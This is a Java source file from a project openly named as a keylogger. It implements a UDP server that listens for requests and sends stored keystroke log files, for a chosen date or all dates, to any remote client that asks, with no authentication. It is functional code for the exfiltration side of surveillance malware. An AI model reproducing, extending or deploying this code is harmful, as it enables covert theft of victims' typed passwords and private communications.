package com.hao.keylogger.controllers.server;

import java.io.File;
import java.io.FileFilter;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.StringTokenizer;
import com.hao.keylogger.models.Resource;
import com.hao.keylogger.utils.FileManager;

public class UDPServerHelper {

	private static UDPServerHelper instance;

	private ServerLogController controller;

	private DatagramSocket socket;
	private InetAddress address;
	private String hostName;
	private int port;

	private final String PROCESS_TAG = "Processing: ";
	private final String CLIENT_TAG = "Client: ";

	private byte[] buffer = new byte[Resource.SERVER_BUFFER_SIZE];

	Thread listenThread;

	private UDPServerHelper(String hostName, int port) {
		this.hostName = hostName;
		this.port = port;
	}

	public static UDPServerHelper getInstance(String hostName, int port) {
		if (instance == null) {
			instance = new UDPServerHelper(hostName, port);
		}
		return instance;
	}

	public static String getLocalHostIP() {
		try {
			return InetAddress.getLocalHost().getHostAddress();
		} catch (UnknownHostException e) {
			e.printStackTrace();
			return "";
		}
	}

	public boolean startServer() {
		try {
			address = InetAddress.getByName(hostName);
			socket = new DatagramSocket(port, address);
			listenThread = new Thread(new RequestReceiver());
			listenThread.start();
			return true;
		} catch (SocketException | UnknownHostException e) {
			e.printStackTrace();
			return false;
		}

	}

	public boolean stopServer() {
		try {
			socket.close();
			return true;
		} catch (Exception e) {
			return false;
		}
	}

	public void setController(ServerLogController controller) {
		this.controller = controller;
	}

	private class RequestReceiver implements Runnable {
		StringTokenizer stringTokenizer;

		@Override
		public void run() {

			while (true) {
				DatagramPacket inPacket = new DatagramPacket(buffer, buffer.length);
				try {
					socket.receive(inPacket);
					String requestMsg = new String(inPacket.getData(), 0, inPacket.getLength());
					controller.appendToMonitory(CLIENT_TAG + requestMsg);

					stringTokenizer = new StringTokenizer(requestMsg, "?");
					String requestType = stringTokenizer.nextToken();

					switch (requestType) {
					case Resource.FETCH_LOG_REQUEST:
						String dateStr = stringTokenizer.nextToken();

						// format name of log files: d-M-yyyy.txt
						SimpleDateFormat sdf = new SimpleDateFormat("d-M-yyyy");
						Date dateOfLog = sdf.parse(dateStr);
						controller.appendToMonitory(PROCESS_TAG + "get log on the day " + dateOfLog.toString());
						getLogAndSend(inPacket.getAddress(), inPacket.getPort(), dateOfLog);
						break;
					case Resource.FETCH_ALL_LOG_REQUEST:
						getAllLogsAndSend(inPacket.getAddress(), inPacket.getPort());
						break;
					}

				} catch (Exception e) {

				}
			}
		}

		private void getAllLogsAndSend(InetAddress address, int port) {
			File logFolder = new File(Resource.LOGS_DIRECTORY);
			File[] files = logFolder.listFiles();

			String numOfLogs = files.length + "";
			sendMessage(address, port, numOfLogs);

			for (File f : logFolder.listFiles()) {
				readFileAndSend(address, port, f.getPath());
			}
		}

		private void getLogAndSend(InetAddress address, int port, Date date) {
			// Tells the client that 1 file is comming
			String numOfLogs = "1";
			sendMessage(address, port, numOfLogs);
			
			// generate log file name
			String dateStr = new SimpleDateFormat("d-M-yyyy").format(date);
			String logFilePath = Resource.LOGS_DIRECTORY + File.separator + dateStr + Resource.LOG_FILE_EXTENSION;

			readFileAndSend(address, port, logFilePath);
		}

		private void readFileAndSend(InetAddress address, int port, String logFilePath) {
			FileManager fm = new FileManager(logFilePath);
			StringTokenizer strTokenizer = new StringTokenizer(fm.getFileName(), ".");
			String dateOfLogStr = strTokenizer.nextToken();
			
			try {
				String logContent = fm.readAll();
				sendMessage(address, port, dateOfLogStr);
				sendMessage(address, port, logContent);
			} catch (IOException e1) {
				controller.appendToMonitory(PROCESS_TAG + "File not found");
			}
		}

		private void sendMessage(InetAddress address, int port, String msg) {
			DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), address, port);
			try {
				socket.send(outPacket);
			} catch (IOException e) {
				controller.appendToMonitory(PROCESS_TAG + "Can not send packet");
			}
		}
	}

}
